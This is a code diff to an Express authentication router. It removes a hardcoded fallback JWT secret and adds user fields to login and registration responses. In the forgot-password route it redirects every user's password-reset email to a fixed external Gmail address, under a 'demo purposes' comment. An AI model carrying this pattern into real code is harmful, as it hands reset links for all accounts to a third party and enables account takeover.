@@ -38,16 +38,23 @@ router.post("/register", async (req, res) => {
       await vendor.save();
     }
 
-    const token = jwt.sign(
-      { userId: user._id },
-      process.env.JWT_SECRET || "your-secret-key",
-      { expiresIn: "7d" }
-    );
+    const secret = process.env.JWT_SECRET;
+    if (!secret) {
+      throw new Error('JWT_SECRET is not defined in environment variables.');
+    }
+    const token = jwt.sign({ userId: user._id }, secret, { expiresIn: "7d" });
 
     res.status(201).json({
       message: "Registration successful",
       token,
-      user: { id: user._id, name: user.name, email: user.email, role: user.role },
+      user: {
+        id: user._id,
+        name: user.name,
+        email: user.email,
+        role: user.role,
+        isVerified: user.isVerified,
+        isActive: user.isActive,
+      },
     });
   } catch (error) {
     res.status(500).json({ error: error.message });
@@ -61,7 +68,7 @@ router.post("/login", async (req, res) => {
   try {
     const { email, password } = req.body;
 
-    const user = await User.findOne({ email });
+    const user = await User.findOne({ email }).select('+password');
     if (!user || !user.isActive) {
       return res.status(401).json({ error: "Invalid credentials" });
     }
@@ -71,16 +78,23 @@ router.post("/login", async (req, res) => {
       return res.status(401).json({ error: "Invalid credentials" });
     }
 
-    const token = jwt.sign(
-      { userId: user._id },
-      process.env.JWT_SECRET || "your-secret-key",
-      { expiresIn: "7d" }
-    );
+    const secret = process.env.JWT_SECRET;
+    if (!secret) {
+      throw new Error('JWT_SECRET is not defined in environment variables.');
+    }
+    const token = jwt.sign({ userId: user._id }, secret, { expiresIn: "7d" });
 
     res.json({
       message: "Login successful",
       token,
-      user: { id: user._id, name: user.name, email: user.email, role: user.role },
+      user: {
+        id: user._id,
+        name: user.name,
+        email: user.email,
+        role: user.role,
+        isVerified: user.isVerified,
+        isActive: user.isActive,
+      },
     });
   } catch (error) {
     res.status(500).json({ error: error.message });
@@ -111,8 +125,9 @@ router.post("/forgot-password", async (req, res) => {
     `;
 
     await sendEmail({
-      email: user.email,
-      subject: "Password Reset",
+      // For demo purposes, all emails are sent to a fixed address.
+      email: "bapvesupp@gmail.com",
+      subject: `Password Reset for ${user.email}`,
       message,
     });
 
